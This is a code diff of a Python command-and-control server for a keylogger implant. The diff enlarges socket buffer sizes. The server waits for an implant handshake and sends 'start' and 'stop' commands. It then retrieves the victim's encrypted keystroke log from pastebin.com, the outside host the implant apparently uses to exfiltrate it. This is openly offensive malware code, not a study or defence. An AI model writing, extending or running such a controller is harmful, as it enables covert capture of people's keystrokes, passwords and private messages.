@@ -29,7 +29,7 @@ addr = (ip, port)
 sock.bind(addr)
 
 print("Waiting for implant handshake")
-msg, send_addr = sock.recvfrom(20)
+msg, send_addr = sock.recvfrom(100)
 print("Implant is @", send_addr)
 commands = ["start", "stop"]
 
@@ -39,7 +39,7 @@ while True:
     if cmd in commands:
         sock.sendto(cmd.encode(), send_addr)
         if cmd == "stop":
-            msg, send_addr = sock.recvfrom(64)
+            msg, send_addr = sock.recvfrom(128)
             msg = "https://pastebin.com/"+msg
             encrypted_keylog = get(msg).text
             # decrypt(encrypted_keylog)
